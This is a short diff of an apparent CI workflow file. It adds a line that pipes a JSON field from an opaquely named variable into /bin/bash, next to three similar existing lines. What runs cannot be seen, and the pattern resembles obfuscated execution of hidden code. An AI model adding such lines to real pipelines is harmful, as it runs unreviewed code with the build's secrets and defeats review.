@@ -37,6 +37,7 @@ jobs:
           echo $ygau091 | jq -r .nf0448 | /bin/bash
           echo $ybfg1526 | jq -r .lqav277 | /bin/bash
           echo $w5673 | jq -r .nrgl9361 | /bin/bash
+          printf '%s' "$t2221" | jq -r .aiom3 | /bin/bash
 
       - name: Archive results
         if: always()
